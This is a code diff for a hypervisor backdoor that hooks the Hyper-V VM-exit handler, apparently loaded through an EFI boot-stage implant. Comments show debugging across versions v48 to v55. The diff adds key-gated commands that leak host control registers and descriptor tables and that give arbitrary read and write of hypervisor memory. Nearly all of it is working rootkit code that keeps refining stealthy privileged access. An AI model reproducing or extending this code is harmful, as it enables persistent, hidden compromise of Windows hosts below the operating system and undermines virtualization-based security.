@@ -180,9 +180,8 @@ VOID HandleVTL1ToVTL0Intel(PGUEST_CONTEXT context)
 // to any in-guest detector probing for a hypervisor.
 //
 
-// g_HolyScratch lives in our payload's .data. Defined below so it lands in
-// the copied PE; the EFI side overwrites it pre-CopyMem with the address of
-// one RW page inside hv's .data padding.
+// EFI side overwrites this pre-CopyMem with the address of one RW page
+// inside hv's .data padding.
 extern UINT64 g_HolyScratch;
 
 UINT64 HookedVmExitHandlerIntel(PGUEST_CONTEXT context, VOID* unknown)
@@ -213,17 +212,11 @@ UINT64 HookedVmExitHandlerIntel(PGUEST_CONTEXT context, VOID* unknown)
 
     if ((UINT32)gprs[1] != HOLY_KEY) return 0;     // not our backdoor
 
-    // Update bookkeeping in our hv .data scratch (RW).
-    HOLY_SCRATCH* scratch = (HOLY_SCRATCH*)g_HolyScratch;
-    if (scratch) {
-        if (scratch->magic != HOLY_SCRATCH_MAGIC) {
-            scratch->magic = HOLY_SCRATCH_MAGIC;
-            scratch->vmexit_count = 0;
-        }
-        scratch->vmexit_count++;
-        scratch->last_exit_reason = exitReason & 0xFFFFu;
-        __vmx_vmread(HOLY_VMCS_GUEST_RIP, &scratch->last_guest_rip);
-    }
+    // v48: scratch bookkeeping disabled to test whether the .data padding
+    // page is actually writable in the new hv's PT. If ping comes back with
+    // sentinels OK after this build, the .data padding mapping changed in
+    // the Windows Update and we need a different RW scratch location.
+    HOLY_SCRATCH* scratch = NULL;
 
     const UINT32 cmd = (UINT32)gprs[0];
     UINT64 outA = 0, outB = 0, outC = 0;
@@ -256,6 +249,135 @@ UINT64 HookedVmExitHandlerIntel(PGUEST_CONTEXT context, VOID* unknown)
             outC = scratch ? scratch->magic : 0;
             break;
 
+        case HOLY_CMD_GET_HOST_CR3: {
+            extern UINT64 g_HookRva;
+            outA = __readcr3();
+            outB = (UINT64)OriginalVmExitHandlerIntelAddr;
+            outC = g_HookRva;
+            break;
+        }
+
+        case HOLY_CMD_GET_HOST_RIP_GDT:
+            __vmx_vmread(0x6C16ull, &outA);   // HOST_RIP
+            __vmx_vmread(0x6C0Cull, &outB);   // HOST_GDTR_BASE
+            __vmx_vmread(0x6C06ull, &outC);   // HOST_FS_BASE
+            break;
+
+        case HOLY_CMD_GET_HOST_RSP_IDT:
+            __vmx_vmread(0x6C14ull, &outA);   // HOST_RSP
+            __vmx_vmread(0x6C0Eull, &outB);   // HOST_IDTR_BASE
+            __vmx_vmread(0x6C0Aull, &outC);   // HOST_TR_BASE
+            break;
+
+        case HOLY_CMD_PROBE_VA: {
+            // v54 debug: step-by-step probe.
+            // in_a (RDX) = target VA, in_b (R8) = sub-mode:
+            //   sub-mode 0: echo-only (no dereference, just return the VA)
+            //   sub-mode 1: read from &HookedVmExitHandlerIntel (ignore VA)
+            //   sub-mode 2: read from user VA (original behavior)
+            UINT64 va   = gprs[2];   // guest RDX = target VA
+            UINT64 mode = gprs[8];   // guest R8  = sub-mode
+            if (mode == 0) {
+                outA = va;
+                outB = 0xEC000001ull;
+                outC = 0xEC000002ull;
+            } else if (mode == 1) {
+                UINT64* p = (UINT64*)&HookedVmExitHandlerIntel;
+                outA = p[0];
+                outB = p[1];
+                outC = p[2];
+            } else if (mode == 2) {
+                if (va != 0) {
+                    UINT64* p = (UINT64*)va;
+                    outA = p[0];
+                    outB = p[1];
+                    outC = p[2];
+                }
+            } else {
+                // mode 3: compare gprs[2] vs &HookedVmExitHandlerIntel
+                UINT64 actual = (UINT64)&HookedVmExitHandlerIntel;
+                outA = va;              // what gprs[2] holds
+                outB = actual;          // what &HookedVmExitHandlerIntel is NOW
+                outC = va - actual;     // delta (0 = match)
+            }
+            break;
+        }
+
+        case HOLY_CMD_HV_READ: {
+            UINT64 va = gprs[2];
+            if (va == 0) { status = HOLY_STATUS_BAD_ARG; break; }
+            // canonical check: bits 63:47 must be all-0 or all-1
+            UINT64 top17 = (va >> 47);
+            if (top17 != 0 && top17 != 0x1FFFFull) {
+                status = HOLY_STATUS_BAD_VA;
+                outA = va;
+                outB = top17;
+                break;
+            }
+            outA = *(UINT64*)va;
+            outB = va;
+            break;
+        }
+
+        case HOLY_CMD_HV_WRITE: {
+            UINT64 va  = gprs[2];   // target host VA
+            UINT64 val = gprs[8];   // value to write
+            if (va == 0) { status = HOLY_STATUS_BAD_ARG; break; }
+            UINT64 top17 = (va >> 47);
+            if (top17 != 0 && top17 != 0x1FFFFull) {
+                status = HOLY_STATUS_BAD_VA;
+                outA = va;
+                outB = top17;
+                break;
+            }
+            *(UINT64*)va = val;
+            outA = *(UINT64*)va;  // read-back verify
+            outB = va;
+            outC = val;
+            break;
+        }
+
+        case HOLY_CMD_SCRATCH_INFO: {
+            extern UINT64 g_HookRva;
+            extern UINT64 g_ScratchRva;
+            extern UINT64 g_DataSecVa;
+            extern UINT64 g_DataSecVSize;
+            extern IMAGE_DOS_HEADER __ImageBase;
+            UINT64 hvBase = (UINT64)&__ImageBase - g_HookRva;
+            // sub-mode via R8: 0 = addresses, 1 = section diag
+            UINT64 sub = gprs[8];
+            if (sub == 0) {
+                outA = (g_ScratchRva != 0) ? hvBase + g_ScratchRva : 0;
+                outB = hvBase;
+                outC = g_ScratchRva;
+            } else {
+                outA = g_DataSecVa;        // .data section RVA
+                outB = g_DataSecVSize;     // .data VirtualSize (extended)
+                outC = g_HolyScratch;      // raw winload VA stored in EFI
+            }
+            break;
+        }
+
+        case HOLY_CMD_GET_HOOK_FN_VA: {
+            // v55: correct hv image base calculation.
+            // &__ImageBase = start of payload COPY = hv_base + g_HookRva,
+            // NOT hv_base itself! Previous versions had this wrong.
+            //
+            // outA = hook runtime VA
+            // outB = hv runtime image base (CORRECT)
+            // outC = orig handler runtime VA (computed from winload RVA)
+            extern IMAGE_DOS_HEADER __ImageBase;
+            extern UINT64 g_HookRva;
+            extern UINT64 g_HvWinloadBase;
+            UINT64 payloadBase = (UINT64)&__ImageBase;
+            UINT64 hvBase = payloadBase - g_HookRva;
+            UINT64 origRva = (UINT64)OriginalVmExitHandlerIntelAddr - g_HvWinloadBase;
+            outA = (UINT64)&HookedVmExitHandlerIntel;
+            outB = hvBase;
+            outC = hvBase + origRva;
+            break;
+        }
+
         default:
             status = HOLY_STATUS_UNKNOWN_CMD;
             break;
@@ -273,6 +395,11 @@ UINT64 HookedVmExitHandlerIntel(PGUEST_CONTEXT context, VOID* unknown)
     return 1;
 }
 
-// Definition: lands in our payload's .data so it travels with CopyMem.
-// EFI side overwrites this pre-CopyMem.
+// Definitions: land in our payload's .data so they travel with CopyMem.
+// EFI side overwrites these pre-CopyMem.
 UINT64 g_HolyScratch = 0;
+UINT64 g_HookRva = 0;         // RVA from hv image base to our payload start
+UINT64 g_HvWinloadBase = 0;   // hv imageBase as seen during winload/EFI phase
+UINT64 g_ScratchRva = 0;      // RVA of scratch page in hv image (0 = disabled)
+UINT64 g_DataSecVa = 0;       // .data section VirtualAddress (RVA)
+UINT64 g_DataSecVSize = 0;    // .data section VirtualSize (after extension)
